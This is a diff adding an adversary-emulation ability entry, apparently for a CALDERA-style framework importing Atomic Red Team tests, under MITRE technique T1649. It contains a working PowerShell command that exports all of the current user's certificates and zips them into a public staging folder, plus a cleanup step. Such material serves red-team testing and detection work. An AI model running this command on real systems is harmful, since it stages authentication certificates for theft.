@@ -1,0 +1,32 @@
+- id: eb121494-82d1-4148-9e2b-e624e03fbf3d
+  name: Staging Local Certificates via Export-Certificate
+  description: Export all user certificates and add to a compressed archive.
+  tactic: credential-access
+  technique:
+    attack_id: T1649
+    name: Steal or Forge Authentication Certificates
+  platforms:
+    windows:
+      psh:
+        command: $archive="$env:PUBLIC\T1649\atomic_certs.zip"; $exfilpath="$env:PUBLIC\T1649\certs";
+          Add-Type -assembly "system.io.compression.filesystem"; Remove-Item $(split-path
+          $exfilpath) -Recurse -Force -ErrorAction Ignore; mkdir $exfilpath | Out-Null;
+          foreach ($cert in (gci Cert:\CurrentUser\My)) { Export-Certificate -Cert
+          $cert -FilePath $exfilpath\$($cert.FriendlyName).cer}; [io.compression.zipfile]::CreateFromDirectory($exfilpath,
+          $archive)
+        cleanup: $exfilpath="$env:PUBLIC\T1649\certs"; Remove-Item $(split-path $exfilpath)
+          -Recurse -Force -ErrorAction Ignore
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - credential-access
+  - atomic-red-team
+  - t1649
+  author: Atomic Red Team
+  additional_info:
+    technique_created: '2022-08-03T03:20:58.955Z'
+    atomic_guid: eb121494-82d1-4148-9e2b-e624e03fbf3d
+    import_timestamp: '2025-06-24T11:15:06.703161Z'
